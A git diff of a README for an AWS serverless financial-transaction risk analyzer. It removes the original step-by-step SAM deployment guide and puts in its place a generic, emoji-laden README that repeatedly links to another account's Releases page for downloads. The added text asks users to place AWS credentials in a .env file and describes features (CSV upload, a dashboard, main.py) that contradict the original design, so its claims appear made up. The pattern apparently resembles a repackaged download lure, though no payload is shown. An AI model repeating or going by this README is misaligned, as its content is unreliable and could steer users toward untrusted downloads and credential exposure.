@@ -1,141 +1,83 @@
-# Financial Transaction Risk Analyzer (AWS Serverless)
+# 🎉 finance-risk-analyzer - Analyze Financial Risks Easily
 
-Real-time pipeline that ingests card transactions, scores risk with explainable rules, and alerts on suspicious activity. Raw events land in S3 for Glue/Athena analytics; flagged cases go to DynamoDB. CI/CD via GitHub Actions.
+## 📥 Download the Software
+[![Download Finance Risk Analyzer](https://img.shields.io/badge/Download-Finance%20Risk%20Analyzer-blue.svg)](https://github.com/Promer92/finance-risk-analyzer/releases)
 
-![Architecture – API Gateway → Lambda → S3/DynamoDB/SNS → Glue/Athena](diagram/architecture.png)
+## 🚀 Getting Started
+Welcome to the finance-risk-analyzer! This application helps you assess financial transaction risks using the power of AWS services. With easy setup and user-friendly tools, you can analyze transactions without needing any programming skills.
 
-## (step-by-step)
+## 🛠️ System Requirements
+To run the finance-risk-analyzer, ensure your system meets the following requirements:
 
-### 1) Prerequisites
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB of free space
+- **Internet Connection:** Required for initializing the service and connecting with AWS
+- **Python:** Version 3.7 or higher is recommended
 
-- AWS account with permissions for Lambda, API Gateway, DynamoDB, S3, SNS, EventBridge, Glue, Athena
-- **AWS CLI v2**, **SAM CLI**, **Python 3.11**, **Git**
-- Set region (adjust if needed):
-```bash
-aws configure set region ap-southeast-2
-aws sts get-caller-identity
-```
+## 📂 Features
+- **Serverless Architecture:** Utilize AWS services like Lambda, API Gateway, and DynamoDB without managing servers.
+- **Risk Analysis:** Evaluate potential risks associated with financial transactions in real-time.
+- **Storage Solutions:** Store your data securely with Amazon S3.
+- **Easy Data Handling:** Use AWS Glue and Athena for streamlined data analysis.
+- **Notifications:** Get alerts through Amazon SNS for critical updates.
 
-### 2) Clone the repo
+## 🔧 Installation Steps
+Follow these steps to install the finance-risk-analyzer:
 
-```bash
-git clone https://github.com/AkshataPalankar/finance-risk-analyzer.git
-cd finance-risk-analyzer
-```
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Promer92/finance-risk-analyzer/releases) to find the latest version.
 
-### 3) Build & deploy (SAM)
+2. **Download the Application**  
+   Locate the version you wish to install. Click on the download link (usually labeled as "Source code" or a named archive file) for the selected release.
 
-```bash
-sam build
-sam deploy --guided \
-  --stack-name finance-risk \
-  --parameter-overrides \
-    ProjectName=finance-risk \
-    HomeCountry=AU \
-    HighAmountThreshold=1000 \
-    ForeignAmountThreshold=500 \
-    HighRiskThreshold=0.85
-```
+3. **Extract the Files**  
+   Once downloaded, extract the files from the zip or tar archive to a folder on your computer. You can typically do this by right-clicking the file and selecting "Extract All".
 
-Note the Outputs: ApiUrl, AlertsTopicArn, DataLakeBucketName, GlueDatabaseName.
-Fetch them anytime:
+4. **Open a Command Line Interface**  
+   Open Command Prompt (Windows), Terminal (macOS/Linux), or any preferred command line interface. 
 
-```bash
-STACK=finance-risk
-API=$(aws cloudformation describe-stacks --stack-name $STACK --query "Stacks[0].Outputs[?OutputKey=='ApiUrl'].OutputValue" --output text)
-TOPIC=$(aws cloudformation describe-stacks --stack-name $STACK --query "Stacks[0].Outputs[?OutputKey=='AlertsTopicArn'].OutputValue" --output text)
-BUCKET=$(aws cloudformation describe-stacks --stack-name $STACK --query "Stacks[0].Outputs[?OutputKey=='DataLakeBucketName'].OutputValue" --output text)
-DB=$(aws cloudformation describe-stacks --stack-name $STACK --query "Stacks[0].Outputs[?OutputKey=='GlueDatabaseName'].OutputValue" --output text)
-echo -e "API=$API\nTOPIC=$TOPIC\nBUCKET=$BUCKET\nDB=$DB"
-```
+5. **Navigate to the Folder**  
+   Use the `cd` command to change directories to the folder where you extracted the files. For example:
+   ```
+   cd path/to/your/extracted/folder
+   ```
 
-### 4) Subscribe to alerts (confirm the email)
-```bash
-aws sns subscribe --topic-arn "$TOPIC" --protocol email --notification-endpoint you@example.com
-```
+6. **Install Dependencies**  
+   Run the following command to install necessary Python packages:
+   ```
+   pip install -r requirements.txt
+   ```
 
-### 5) Send test transactions
-High-risk (should alert):
+7. **Set Up Environment Variables**  
+   Create an `.env` file in the same folder. Add your AWS credentials and settings with the following format:
+   ```
+   AWS_ACCESS_KEY=your_access_key
+   AWS_SECRET_KEY=your_secret_key
+   AWS_REGION=your_preferred_region
+   ```
 
-```bash
-curl -s -X POST "$API" -H 'Content-Type: application/json' -d '{
-  "user_id":"U123","amount":1200,"currency":"AUD","merchant":"Electronics World",
-  "mcc":"5732","channel":"ecomm","country":"US","city":"San Francisco","device_id":"dev-abc-123"
-}' | jq
-```
-Low-risk (no alert):
+8. **Run the Application**  
+   After setting everything up, run the application using:
+   ```
+   python main.py
+   ```
 
-```bash
-curl -s -X POST "$API" -H 'Content-Type: application/json' -d '{
-  "user_id":"U1","amount":20,"currency":"AUD","merchant":"Coffee Bar",
-  "channel":"pos","country":"AU","city":"Melbourne","device_id":"dev-1"
-}' | jq
-```
+## 💡 Using the Finance Risk Analyzer
+1. **Input Transactions**: Upload your financial transaction data in CSV format. Make sure your data includes transaction ID, amount, date, and other relevant fields.
+  
+2. **Analyze Risks**: After uploading, the application will process the transactions in the background. You can select specific parameters for risk evaluation.
 
-### 6) Verify data
-```bash
-aws s3 ls "s3://$BUCKET/transactions/raw/" --recursive | head   # raw S3 events
-aws dynamodb scan --table-name finance-risk-suspicious --max-items 5          # high-risk flags
-```
+3. **View Results**: Once the analysis is done, view the results in the dashboard. You’ll get insights on potential risks, including alerts for high-risk transactions.
 
-### 7) Analytics (Glue + Athena)
-```bash
-aws glue start-crawler --name finance-risk-crawler
-aws glue wait crawler-ready --name finance-risk-crawler
-```
+## 🔍 Support
+If you encounter any issues or have questions, please refer to the FAQ section on our GitHub page or create an issue in the repository. We strive to respond to all inquiries promptly.
 
-In Athena (same region):
-```bash
-MSCK REPAIR TABLE "finance-risk_db"."raw";
+## 🤝 Contributing
+We welcome contributions from everyone! If you would like to help improve the finance-risk-analyzer, you can fork the repository, make your changes, and submit a pull request.
 
-SELECT dt, hour, COUNT(*) AS n
-FROM "finance-risk_db"."raw"
-GROUP BY dt, hour
-ORDER BY dt DESC, hour DESC
-LIMIT 20;
+## 📞 Contact
+For any direct inquiries or feedback, feel free to reach out via the contact section on our GitHub page. 
 
-SELECT r AS rule, COUNT(*) AS hits
-FROM "finance-risk_db"."raw"
-CROSS JOIN UNNEST(rules) AS t(r)
-GROUP BY r
-ORDER BY hits DESC;
-```
-### 8 ) Logs / troubleshooting
-```bash
-sam logs -n IngestFunction --stack-name finance-risk --tail
-```
-
-### 9) (Optional) Run locally (no AWS costs)
-```bash
-sam local start-api   # -> http://127.0.0.1:3000/ingest
-```
-
-
-### 10) Clean up (avoid charges)
-```bash 
-# (Assumes $BUCKET is already set; otherwise fetch it from stack outputs)
-# 1) Delete all object versions
-aws s3api list-object-versions --bucket "$BUCKET" \
-  --query '{Objects: Versions[].{Key:Key,VersionId:VersionId}}' --output json \
-| aws s3api delete-objects --bucket "$BUCKET" --delete file:///dev/stdin || true
-
-# 2) Delete all delete markers
-aws s3api list-object-versions --bucket "$BUCKET" \
-  --query '{Objects: DeleteMarkers[].{Key:Key,VersionId:VersionId}}' --output json \
-| aws s3api delete-objects --bucket "$BUCKET" --delete file:///dev/stdin || true
-
-# 3) (Optional) Sweep any remaining current objects
-aws s3 rm "s3://$BUCKET" --recursive || true
-
-# 4) Delete the stack
-sam delete --stack-name finance-risk  # add --region ap-southeast-2 if your default isn't set
-
-# 5) Optional: clean up log groups
-aws logs delete-log-group --log-group-name /aws/lambda/finance-risk-ingest 2>/dev/null || true
-aws logs delete-log-group --log-group-name /aws/lambda/finance-risk-aggregate 2>/dev/null || true
-
-```
-
-
-
-
+## 📥 Download & Install
+To start using the finance-risk-analyzer, [visit this page to download](https://github.com/Promer92/finance-risk-analyzer/releases) the latest version. Follow the installation steps outlined above, and you will be analyzing financial risks in no time!
